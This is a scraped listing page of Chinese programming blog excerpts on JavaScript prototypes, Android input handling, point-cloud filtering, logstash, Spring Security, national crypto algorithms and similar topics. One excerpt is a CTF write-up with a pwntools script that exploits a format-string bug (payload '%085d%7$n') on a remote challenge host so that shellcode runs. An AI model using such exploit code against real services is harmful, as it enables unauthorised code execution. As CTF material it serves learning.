			<a href="/posts/34d9e3cad3f70cccf7f3578617e9793b/" rel="bookmark">
			js原型及原型链
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原型 在构造函数创建出来的时候，系统会默认帮构造函数创建一个原型对象。
原型的作用： 原型对象中的属性和方法可以被构造函数创建出来的对象访问。
如何访问构造函数的原型： 构造函数.prototyoe
属性(方法)的查找原则：
当访问对象的成员的时候，会在自身找有没有，如果有直接使用，
如果没有找到，则去当前对象的原型对象中找，如果找到了直接使用
如果没有找到，则去原型对象的原型对象中找，如果找到了直接使用
如果没有找到，继续向上查找，直到找到Object.prototype,如果没有属性则是undefined 方法则报错
通过对象访问原型： _proto_属性（是一个非标准的属性，不推荐使用，主要用来做调试）
在使用新的对象替换掉默认的原型对象之后，原型对象中的constructor属性会变成Object,为了保证原型能正常访问，需要在原型上加一个constroctor 属性指向构造函数
原型继承： （1）利用原型中的成员可以被其他相关的对象共享这一特性，可以实现继承，这种实现继承的方式叫原型继承。
//1，给原型对象中添加成员 对象继承了原型对象 function Person(name,age){ this.name=name; this.age=age; } Person.prototype.sayHello=function(){ console.log("我是person的方法"); } var p = new Person("张三",2); p.sayHello(); （2）直接替换原型对象来继承 (很可能会将原有原型中的成员丢失)
function Person(name,age){ this.name=name; this.age=age; } var Parent = { sayHello:function (){ console.log("我是父类的方法"); } } Person.prototype= Parent; var p = new Person("张三",2); p.sayHello(); （3）利用混入的方式给原型对象添加成员
function Person(name,age){ this.name=name; this.age=age; } var Parent = { sayHello:function (){ console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34d9e3cad3f70cccf7f3578617e9793b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4b1cf83c8ae82cf30ad34bd0c579de7/" rel="bookmark">
			android 按键事件上报机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 按键上报和分发机制 按键处理设计的整体思路是驱动层会有一个消息队列来存放事件，会有一个Reader来不停的读取事件，一个Dispatcher来分发消息队列中的事件。Dispatcher分发的事件最后会通过jni上报到InputManagerService，然后通过接口最后传递给PhoneWindow，这里再根据不同的按键事件类型来做不同的处理。
1.1 输入事件处理准备工作 当系统开机之后SystemServer会启动InputManagerService，在SystemServer.java中的startOtherServices()方法中启动：
Slog.i(TAG, "Input Manager"); inputManager = new InputManagerService(context); Slog.i(TAG, "Window Manager"); wm = WindowManagerService.main(context, inputManager, mFactoryTestMode != FactoryTest.FACTORY_TEST_LOW_LEVEL, !mFirstBoot, mOnlyCore); ServiceManager.addService(Context.WINDOW_SERVICE, wm); ServiceManager.addService(Context.INPUT_SERVICE, inputManager); mActivityManagerService.setWindowManager(wm); inputManager.setWindowManagerCallbacks(wm.getInputMonitor()); inputManager.start(); 复制代码 看一下InputManagerService的构造方法：
public InputManagerService(Context context) { this.mContext = context; this.mHandler = new InputManagerHandler(DisplayThread.get().getLooper()); mUseDevInputEventForAudioJack = context.getResources().getBoolean(R.bool.config_useDevInputEventForAudioJack); Slog.i(TAG, "Initializing input manager, mUseDevInputEventForAudioJack=" + mUseDevInputEventForAudioJack); mPtr = nativeInit(this, mContext, mHandler.getLooper().getQueue()); LocalServices.addService(InputManagerInternal.class, new LocalService()); } 复制代码 主要是通过JNI的方式调用nativeInit方法传入一个消息队列作为参数，nativeInit对应是com_android_server_input_InputManagerService.cpp中的nativeInit。
static jlong nativeInit(JNIEnv* env, jclass /* clazz */, jobject serviceObj, jobject contextObj, jobject messageQueueObj) { sp&lt;MessageQueue&gt; messageQueue = android_os_MessageQueue_getMessageQueue(env, messageQueueObj); if (messageQueue == NULL) { jniThrowRuntimeException(env, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4b1cf83c8ae82cf30ad34bd0c579de7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ca1fe19f7371c4c4913a2c550fa5161/" rel="bookmark">
			NUAActf string wp
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		64位的格式化串还没做过，导致做了半天。
拿到题目检查下防护：
开启了canary。
简单运行看了下程序逻辑后放到IDA里：
为了方便看，部分变量名已修改：
sub_400A70这个函数里没啥问题。
输入east退出来。进入east函数：
里面有个格式化串的漏洞：
继续往下看：
关键在：
将输入的这个字符串的首地址强制转化为函数指针后调用他。
看汇编清楚点：
那这里就可以读入shellcode，然后再调用shellcode即可。
想要触发这个模块，需要
从main函数可以看到：
已经将地址给泄露出来了，只需要用格式化串漏洞，将其修改为85即可。
exp如下：
from pwn import * #a=process("./string") #gdb.attach(a,"b *0x0000000000400C72") a=remote("111.198.29.45","30230") a.recvuntil("secret[0] is ") v3_addr=a.recvuntil("\n") v3_addr="0x"+v3_addr[:-1] v3_address=eval(v3_addr) print (hex(v3_address)) a.recvuntil("What should your character's name be:\n") a.sendline("a") a.recvuntil("So, where you will go?east or up?:\n") a.send("east\n") a.recvuntil("go into there(1), or leave(0)?:\n") a.send("1\n") a.recvuntil("'Give me an address'\n") a.send(str(v3_address)+"\n") a.recvuntil("you wish is:\n") payload="%085d%7$n" a.sendline(payload) a.recvuntil("Wizard: I will help you! USE YOU SPELL\n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ca1fe19f7371c4c4913a2c550fa5161/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9b703f42c9017b5a7de7406faf50bb3/" rel="bookmark">
			软件工程师学习硬件原理图--第一讲看懂GPIO和门电路（弱智学前班儿童系列）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开篇引言： 开这个的原因是因为，对于一个从小搞软件，除了电容，电阻，还有用过蓝福电池、奥迪双钻电池的我，真一直都搞求不懂这些硬件原理图，所以对于FPGA工程师来说，至少你得会看原理图吧，原理图都不会看，那写个锤子的程序哟，还怎么分配管教，就像学单片机的童鞋一样，单片机只知道写流水灯，电路不会，那也顶个肺。有很多人就说，去看模电，数电，跟着做做就会了，然而书本上面讲的都是什么基尔霍夫定理，这顶个毛用，我们就只要看懂原理图，你叫我们绕这么一大圈子，岂不是浪费我们时间，得力不讨好。
我一直不是希望自己会画多少层的板，这些有专门的硬件工程师做，但是，至少原理图会得看，而且每次我想搜一搜什么Alti design，这些PCB的视频教学，都将这个软件怎么用，不讲解为毛这里要这么画。所以，经过重重摸索，我决定对此开设一个专题讲解，针对软件工程师如何学习原理图，最终实现能够看懂原理图就是我们的目的了。
欢迎专业的硬件工程师点评补充指导！
1. 最简单的3.3V点亮小灯 如上图
如果我们输出电平为1，就3.3V，就可以点亮LED。
如上图
如果我们不关闭按键，此时没有电流，MCU连接的点就是3.3V。
一旦开关按下，电流导通，此点的电压就是0.
所以，我们就可以通过输入的此点的电压是0还是3.3v（1）来判断开关是否按下。
下面我们可以看看实际的电路原理图
想让LED点亮，我们就让nLED1输出低电平，这样就有电流流过了。
通过搜索nLED1,我们就可以搜索到，接到了GPF4这个引脚
如何设置为输出引脚呢？我们需要找到对应的芯片手册，查看该引脚GPF4，怎么配置。
可以看到，我们配置为01，就是output.
- 三极管 口诀：箭头朝内 PNP，导通电压顺箭头过
三极管有截止、放大、饱和三种工作状态，我们通常用截止区、饱和区。
记住：总之是箭头的始端比末端高 0.7V 就可以导通三极管的 e 极和 c 极。否则视作断路。
三极管的用法特点，关键点在于 b 极（基极）和 e 级（发射极）之间的电压情况，对于PNP 而言，e 极电压只要高于 b 级 0.7V 以上，这个三极管 e 级和 c 级之间就可以顺利导通。也就是说，控制端在 b 和 e 之间，被控制端是 e 和 c 之间。同理，NPN 型三极管的导通电压是 b 极比 e 极高 0.7V，总之是箭头的始端比末端高 0.7V 就可以导通三极管的 e 极和 c 极。
三极管基极通过一个 10K 的电阻接到了单片机的一个 IO口上，假定是 P1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9b703f42c9017b5a7de7406faf50bb3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85ba71f0c8e6ee923065ad6e4fbaebdf/" rel="bookmark">
			leetcode-62-不同路径 (unique paths)-java
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目及测试
package pid062; /*不同路径 一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。 机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。 问总共有多少条不同的路径？ 例如，上图是一个7 x 3 的网格。有多少可能的路径？ 说明：m 和 n 的值均不超过 100。 示例 1: 输入: m = 3, n = 2 输出: 3 解释: 从左上角开始，总共有 3 条路径可以到达右下角。 1. 向右 -&gt; 向右 -&gt; 向下 2. 向右 -&gt; 向下 -&gt; 向右 3. 向下 -&gt; 向右 -&gt; 向右 示例 2: 输入: m = 7, n = 3 输出: 28 */ public class main { public static void main(String[] args) { int[] testTable = {3,7,30,1}; int[] testTable2 = {2,3,30,2}; for (int i=0;i&lt;testTable.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85ba71f0c8e6ee923065ad6e4fbaebdf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44019aa828e8e0d5625f103b962e41a3/" rel="bookmark">
			PCL点云滤波去噪
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要对点云滤波？
一般下面这几种情况需要进行点云滤波处理：
（1） 点云数据密度不规则需要平滑
（2） 因为遮挡等问题造成离群点需要去除
（3） 大量数据需要下采样
（4） 噪声数据需要去除
点云中的噪声点对后续操作的影响比较大。就像盖房子一样，地基有很多瑕疵，如果不加以处理最终可能会导致整个房子坍塌的。不过别担心，PCL中有一个专门的点云滤波模块，可以将噪声点去除，还可以进行点云压缩等操作，非常灵活实用，例如：双边滤波，统计滤波，条件滤波，随机采样一致性滤波等。这样才能够更好的进行配准，特征提取，曲面重建，可视化等后续应用处理。PCL中关于点云滤波的所有函数都在这里：
http://docs.pointclouds.org/trunk/group__filters.html
一般来说，滤波对应的方案有如下几种：
（1）按照给定的规则限制过滤去除点
（2） 通过常用滤波算法修改点的部分属性
（3）对数据进行下采样
1.点云下采样： 点云的数目越大，储存、操作都是个大问题！通过按一定的规则从里面抽取有代表性的样本，可以代替原来的样本，节省计算开销，这个下采样PCL中有专门的类，叫做
class pcl::ApproximateVoxelGrid&lt; PointT &gt; 比较适合对海量的点云在处理前进行数据压缩，而且可以在特征提取等处理中选择合适的体素（voxel）大小等参数，提高算法效率。该函数对输入的点云数据创建一个三维体素栅格，每个体素内用体素中所有点的重心来近似显示体素中其他点，这样该体素内所有点都用一个重心点最终表示。它的优点是可以在下采样的时候保存点云的形状特征。
关键代码：
pcl::VoxelGrid&lt;PointT&gt; downSampled; //创建滤波对象 downSampled.setInputCloud (cloud); //设置需要过滤的点云给滤波对象 downSampled.setLeafSize (0.01f, 0.01f, 0.01f); //设置滤波时创建的体素体积为1cm的立方体，三个参数表示体素栅格叶大小，分别表示体素在XYZ方向的尺寸 downSampled.setDownsampleAllData(bool downsample)//设置是否对所有的字段进行下采样 downSampled.filter (*cloud_downSampled); //执行滤波处理，存储输出 setDownsampleAllData的意思是：点云有不同的类型，比如 PointXYZ，有的是PointXYZRGB，还有其他类型，也就是一个点包含多种不同信息，比如空间位置XYZ，颜色信息RGB，或者强度信息等，如果想要对所有信息（字段）下采样则设置为true，只对XYZ下采样的话设置为false。下采样结果如下图所示。
2.去除点云的离群点 离群点对应的英文是outliers，也叫外点，就是明显偏离“群众”的点，比如我们用激光扫描一面平坦的墙壁，正常情况下得到的应该是差不多也位于同一个平面的点云，但是由于设备测量误差等原因，会产生少量脱离群众的空间点，离本来的墙壁过远，我们就叫这部分点为离群点。离群点会使局部点云特征(如表面法线或曲率变化)的估计复杂化，从而导致错误的值，从而可能导致点云配准失败。列举两个常用的去除离群点的类：StatisticalOutlierRemoval 、RadiusOutlierRemoval
2.1 StatisticalOutlierRemoval 顾名思义，使用统计分析技术，从一个点云数据中集中移除测量噪声点。对每个点的邻域进行统计分析，剔除不符合一定标准的邻域点。具体来说：
1.对于每个点，计算它到所有相邻点的平均距离。假设得到的分布是高斯分布，我们可以计算出一个均值 μ 和一个标准差 σ；
2.这个邻域点集中所有点与其邻域距离大于 μ + std_mul * σ 区间之外的点都可以被视为离群点，并可从点云数据中去除。std_mul 是标准差倍数的一个阈值，可以自己指定。
pcl::StatisticalOutlierRemoval&lt;pcl::PointXYZ&gt; sor; //创建滤波器对象 sor.setInputCloud (cloud); //设置待滤波的点云 sor.setMeanK (50); //设置在进行统计时考虑的临近点个数 sor.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44019aa828e8e0d5625f103b962e41a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e14e51b4692acfdf3edc9fe8f3b567a/" rel="bookmark">
			用logstash收集nginx日志，并输出至node.js API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在做日志系统，一直在研究logstash+elasticsearch的实现方案。
logstash是一个文本内容的收集工具，elasticsearch是一个检索引擎，理想状态下，logstash收集并且整理好的内容，发送到elasticsearch的索引内，可以实现全文检索
logstash，和elasticsearch的配置相对都简单，你只要在本机安装了java环境后，再去https://www.elastic.co/下载logstash和elasticsearch，然后对他们进行解压，可以说，到这一步这个事情基本就算做完了。
不过要想让她按照你想要的工作开始，还是要进行一点点简单的配置，在logstash的bin目录下创建logstash.conf文件，然后简单配置一下你刚才创建的logstash.conf，文件，文件内容基本如下
input是要采集的日志文件的路径，我主要要分析nginx
input { file { path =&gt; ["access.log"] type =&gt; "nginx-access" start_position =&gt; "beginning" } file { path =&gt; ["error.log"] type =&gt; "nginx-error" start_position =&gt; "beginning" } stdin{ } } filter是用于筛选数据的，可以用grok来匹配出你要的字段格式
filter { if [type] == "nginx-access" { grok{ match =&gt; ["message","%{IPORHOST:client_ip}\s{1,}\-\s\-\s\[%{HTTPDATE:timestamp}\]\s{1,}\"(?:%{WORD:verb}\s{1,}%{NOTSPACE:request}(?:\s{1,}HTTP/%{NUMBER:http_version})?|-)\" %{NUMBER:response}\s{1,}(?:%{NUMBER:bytes}|-)\s{1,}%{QS:referrer}\s{1,}%{QS:agent}"] } ruby{ code =&gt; "event.set('logdateunix',event.get('logdate').to_i)" } } else if [type] == "nginx-error" { grok { match =&gt; [ "message", "(?&lt;time&gt;\d{4}/\d{2}/\d{2}\s{1,}\d{2}:\d{2}:\d{2})\s{1,}\[%{DATA:err_severity}\]\s{1,}(%{NUMBER:pid:int}#%{NUMBER}:\s{1,}\*%{NUMBER}|\*%{NUMBER}) %{DATA:err_message}(?:,\s{1,}client:\s{1,}(?&lt;client_ip&gt;%{IP}|%{HOSTNAME}))(?:,\s{1,}server:\s{1,}%{IPORHOST:server})(?:, request: %{QS:request})?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e14e51b4692acfdf3edc9fe8f3b567a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/882d73c8cfe342affa25f60ddbaa934f/" rel="bookmark">
			android 快速方便的将项目复制到其他电脑上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		是否经常出现在公司电脑上运行没有任何问题，但复制到自己或其他电脑上却是各种报错，各种打不开的情况？
是否发现app才30M不到，但复制项目却要300M甚至更多，有时还不得不压缩的问题？
现在，你只需要这样既可：
1.首先你的build.gradle的key等路径配置不要写死，见Android studio build.gradle 基本设置配置，如果还使用git见
android git .gitignore 忽略文件基本配置 经常冲突解决
2.其实在.gitignore里已经告诉你该删除哪些了，关掉as，打开文件夹删除所有无关文件（就是.gitignore所要忽略的文件），大致有根目录下的.gradle、.idea、build（自定义忽略）、gradle、gradlew、gradlew.bat、local.properties（自定义忽略）以及app和第三方目录下的build、app.iml，如图：
3.如果你只是纯粹的复制项目，试试把.git（git的管理数据）也删掉
如果你的配置和博主的一样的话，那么恭喜你，1分钟搞定，右键看看文件大小吧，是不是很惊奇
如果打开的项目包含这些无关文件的并报错也可以这样操作，然后再打开as即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8663341f4865758ebb7ead1bae28604f/" rel="bookmark">
			cesium获取当前层级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		与二维不同，cesium其实没有层级的概念，二维之中当前层级是由zoom来控制，但是三维，视角的范围全靠视角高度来控制。
var currentMagnitude = viewer.camera.getMagnitude(); console.log('currentMagnitude - ' + currentMagnitude); viewer.camera.zoomIn((10000000)); console.log('NewMagnitude - '+ viewer.camera.getMagnitude()); zoomin代表高度拉近多少。
zoomout代表视角高度拉远多少，也不用去管当前视角高度，因此他就是相对于当前高度的
//在后来的实践中，发现还是需要计算二维对应的层级。
查看源码可以发现，该函数使用到了层级的概念
requestImage具体请求瓦片数据 TimeDynamicImagery 将层级传给requestImage函数--暂停研究
https://www.jianshu.com/p/2d4bd6e30c1b 打包命令
二维之中可以用地理距离除canvas的宽度得到resolution去与标准的resolution集比较
但cesium的层级好像不可以这样算。先暂时记录一下。包括鼠标事件。84坐标与墨卡托投影的转换
获取当前视角范围
https://blog.csdn.net/yk583443123/article/details/90521081
cesium中的鼠标事件
https://blog.csdn.net/qq_30100043/article/details/86637203
84坐标系转为墨卡托坐标系
https://blog.csdn.net/a0405221/article/details/78772303
var earthRad = 6378137.0; var handler = new Cesium.ScreenSpaceEventHandler(viewer.canvas); handler.setInputAction(function(event) { var rectangle = viewer.camera.computeViewRectangle(); // var west =rectangle.west / Math.PI * 180; // var east = rectangle.east / Math.PI * 180; var dis=(rectangle.west- rectangle.east)*earthRad console.log(dis/700) }, Cesium.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8663341f4865758ebb7ead1bae28604f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9114f9a3e840229caf927773d97946e/" rel="bookmark">
			MVVMLight(一)入门教程、WPF使用MVVMLitht教程。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、入门教程 1、http://www.cnblogs.com/shanlin/p/3954531.html
不全是MVVM模式，但是楼主自己做了一个软件给自己使用，值得学习。软件界面以及在代码在连接里面有
2、https://www.cnblogs.com/manupstairs/p/4890300.html
提供了MvvmLight框架使用入门（一）到（四）入门教程
3、https://www.cnblogs.com/3xiaolonglong/p/10001787.html共七篇文章
4、https://www.cnblogs.com/lovecsharp094/p/5837668.html
6、https://github.com/lbugnion/mvvmlight
来自MVVMLight的创作者lbugnion（全名叫Laurent Bugnion）
二、WPF使用MVVMLitht的教程 参考：
1、MvvmLight (.net wpf)在项目中的应用 https://www.cnblogs.com/coder-fang/p/8692602.html
2、https://blog.csdn.net/mybelief321/article/details/44423845
3、http://www.cnblogs.com/Mushrooms/p/3794849.html
4、https://blog.csdn.net/yl2isoft/article/details/20838149
5、这篇博客给出了一个刷单软件的雏形（不是用MVVMLight，而是用Caliburn.Micro框架）https://www.cnblogs.com/xcj26/p/5462972.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28a1703e5b69265baa8d3fd58ebdf642/" rel="bookmark">
			卜若的代码笔记-Unity与服务器系列-第一章：通过Unity上传图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前写过使用java上传的
https://blog.csdn.net/qq_37080133/article/details/84866777
public static void UploadImage(string imgPath, string uploadUrl) { HttpWebRequest request = WebRequest.Create(uploadUrl) as HttpWebRequest; request.AllowAutoRedirect = true; request.Method = "POST"; string boundary = DateTime.Now.Ticks.ToString("X"); // 随机分隔线 request.ContentType = "multipart/form-data;charset=utf-8;boundary=" + boundary; byte[] itemBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n"); byte[] endBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n"); int pos = imgPath.LastIndexOf("\\"); string fileName = imgPath.Substring(pos + 1); //请求头部信息 StringBuilder sbHeader = new StringBuilder(string.Format("Content-Disposition:form-data;name=\"rawPicFile\";filename=\"{0}\"\r\nContent-Type:application/octet-stream\r\n\r\n", fileName)); byte[] postHeaderBytes = Encoding.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/28a1703e5b69265baa8d3fd58ebdf642/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/760bd857f81755e63341186c9555896e/" rel="bookmark">
			spring boot security  将您重定向的次数过多
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在学习spring boot security的过程中遇到了这样的一个问题。
查看代码，为了跳转到我们自己定义的登录页面，写了loginPage("/login.html")，按照正常的逻辑，应该我们在访问接口的时候，都会跳到登录页面，结果却报错了。其原因是我们在访问接口时，因为有 anyRequest()，对所有的请求都要进行认证，所以会跳到login.html这个页面，跳转过去之后去请求login.html这个页面也需要身份认证，所以还是跳到了login.html这个页面，形成了死循环，所以会出现这个错误。
http.formLogin() .loginPage("/login.html") .and() .authorizeRequests() .anyRequest() .authenticated(); 解决方式：加上.antMatchers("/login.html").permitAll() ,在这个方法里添加的url是不需要进行身份认证的，如果以后有更多的页面需要加入，只需要以逗号隔开就行，如antMatchers("/login.html","/index.html").permitAll()
http.formLogin() .loginPage("/login.html") .and() .authorizeRequests() .antMatchers("/login.html").permitAll() .anyRequest() .authenticated(); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b653e195926f08de1eb2460712a69977/" rel="bookmark">
			ubuntu下新建用户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、查看系统现有的用户，可以进入/home目录下查看，但是有些用户没有在这个目录下创建文件夹，所以最好的办法就是查看/etc/passwd文件。
2、使用useradd命令创建新用户，需要注意的是需要加一个-m才能在/home目录下创建对应的文件夹，否则不会。也可以使用adduser命令，该命令会在/home下创建对应的文件夹。
3、使用passwd命令设置新添加的用户的密码。
4、使用userdel命令删除相应的用户，如果想同时删除该用户对应的文件夹，需要添加-r。
需要注意的是，如果要删除的用户当前已登陆，是删除不掉的，必须注销掉当前用户切换为另一个用户下，才能删除。
注意：su和sudo命令的区别：
su ：用户切换工具
sudo ：sudo 是通过另一个用户来执行命令（execute a command as another user），su 是用来切换用户，然后通过切换到的用户来完成相应的任务，但sudo 能后面直接执行命令，比如sudo 不需要root 密码就可以执行root 赋与的执行只有root才能执行相应的命令；但得通过visudo 来编辑/etc/sudoers来实现；比如使上面创建的project用户能够使用sudo命令，需要如下操作：
执行sudo visudo 命令，并按如下修改：
然后执行Ctrl+O保存，执行完Ctrl+O后，会输出”File Name to Write sudoers.tmp”，在tmp后执行回车，最后执行Ctrl+X退出。 =====》》》命令可以参考:
https://www.jb51.net/article/45846.htm
======》》》修改sudoers可以参考：
https://blog.csdn.net/xundh/article/details/46233817
https://blog.csdn.net/weiyi556/article/details/78980139
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19cdc57f222fad34b8541070488223b6/" rel="bookmark">
			5620系列密码清除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1,按"D"进入bios菜单
2,选择菜单编号"1"
3,选择“Download Data file to flash”
4,选择"Xmodem"进行传送文件(空配置文件)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ae35fd105a17c2177ca468e5d40dd09/" rel="bookmark">
			数据库系列_shell脚本连接postgresql并操作数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以前抽数据都是重其他数据库抽取到postgres数据库的所以选择kettle。新项目需求里需要把客户给的csv文件数据抽到postgresql，其中还需要对相关字段进行清洗。先声明下kettle也可以实现，但是总感觉依赖第三方软件抽数据不如直接操作数据库，除非逼不得已，尽量不用（纯属个人见解）。于是就研究linux直接连接数据库处理这部分需求。代码如下
#!/bin/bash # ***************************************************** # ** linux_schedule_test # ***************************************************** #\copy test from '/etl-script/test.csv' delimiter ',' csv header encoding 'UTF8'; # copy test_copy to 'D:\test_copy1.csv' delimiter ',' csv header encoding 'GBK'; export PATH=/usr/pgsql-10/bin:/usr/bin; psql "host=127.0.0.1 port=5434 user=admin password=123456 dbname=linux_schedule_test" &lt;&lt; EOF #2&gt;/dev/null \copy test from '/etl-script/test.csv' delimiter ',' csv header encoding 'GBK'; create table test$(date +%Y%m%d_%H%m%S) as select * from test; \q EOF export PATH=/usr/pgsql-10/bin:/usr/bin ：因为环境作用域问题，最好在脚本开始处将要用到的命令添加PATH路径。
psql "host=127.0.0.1 port=5434 user=admin password=123456 dbname=linux_schedule_test"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ae35fd105a17c2177ca468e5d40dd09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/590709fd76a198fb0c46b241ada51331/" rel="bookmark">
			skywalking 启动流程(一)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		skywalking collector 整体代码比较清晰，采用模块化开发。
启动模块server-starter，此模块代码十分简单，主要实现了加载配置，并启动各个模块的功能。
OAPServerStartUp 该类是这个程序的入口。
public static void main(String[] args) { //配置文件 ApplicationConfigLoader configLoader = new ApplicationConfigLoader(); ModuleManager manager = new ModuleManager(); try { //读取配置 ApplicationConfiguration applicationConfiguration = configLoader.load(); //初始化给定的模块 manager.init(applicationConfiguration); String mode = System.getProperty("mode"); if ("init".equals(mode)) { logger.info("OAP starts up in init mode successfully, exit now..."); System.exit(0); } } catch ( Exception e) { System.exit(1); } } 首先加载配置，配置文件信息加载，并封装到配置对象中。
@Override public ApplicationConfiguration load() throws ConfigFileNotFoundException { ApplicationConfiguration configuration = new ApplicationConfiguration(); //加载配置文件application.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/590709fd76a198fb0c46b241ada51331/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6be1649bcf7e4e789fc0de16ebeba358/" rel="bookmark">
			java 国密算法sm2、sm3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。密钥长度和分组长度均为128位。
SM1 为对称加密。其加密强度与AES相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。
SM2为非对称加密，基于ECC。该算法已公开。由于该算法基于ECC，故其签名速度与秘钥生成速度都快于RSA。ECC 256位（SM2采用的就是ECC 256位的一种）安全强度比RSA 2048位高，但运算速度快于RSA。
SM3 消息摘要。可以用MD5作为对比理解。该算法已公开。校验结果为256位。
SM4 无线局域网标准的分组数据算法。对称加密，密钥长度和分组长度均为128位。
由于SM1、SM4加解密的分组大小为128bit，故对消息进行加解密时，若消息长度过长，需要进行分组，要消息长度不足，则要进行填充。
java代码下载：
https://download.csdn.net/download/weixin_30512027/10901805
pom需添加
&lt;!--国密--&gt; &lt;dependency&gt; &lt;groupId&gt;org.bouncycastle&lt;/groupId&gt; &lt;artifactId&gt;bcprov-jdk15on&lt;/artifactId&gt; &lt;version&gt;1.56&lt;/version&gt; &lt;/dependency&gt; sm2：
public class SM2 { private static BigInteger n = new BigInteger( "FFFFFFFE" + "FFFFFFFF" + "FFFFFFFF" + "FFFFFFFF" + "7203DF6B" + "21C6052B" + "53BBF409" + "39D54123", 16); private static BigInteger p = new BigInteger( "FFFFFFFE" + "FFFFFFFF" + "FFFFFFFF" + "FFFFFFFF" + "FFFFFFFF" + "00000000" + "FFFFFFFF" + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6be1649bcf7e4e789fc0de16ebeba358/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96546209a534e4e1714c077383adb0e8/" rel="bookmark">
			小程序获取openid 获取绑定手机号，获取unionid
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//根据code换取用户openId @SuppressWarnings({"static-access", "resource"}) @RequestMapping(value = "getOpenId") public JSONObject getOpenId(HttpServletRequest request, HttpServletResponse response) { try { response.setHeader("Access-Control-Allow-Origin", "*"); String appid ="";//appid String secret ="";//密钥 String code = request.getParameter("code"); if (!StringUtils.isBlank(appid)) { String url = "https://api.weixin.qq.com/sns/jscode2session?appid=" + appid + "&amp;secret=" + secret + "&amp;js_code=" + code + "&amp;grant_type=authorization_code"; HttpClient client = new DefaultHttpClient(); // 发送get请求 HttpGet req = new HttpGet(url); HttpResponse res = client.execute(req); String strResult = ""; if (res.getStatusLine().getStatusCode() == HttpStatus.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96546209a534e4e1714c077383adb0e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
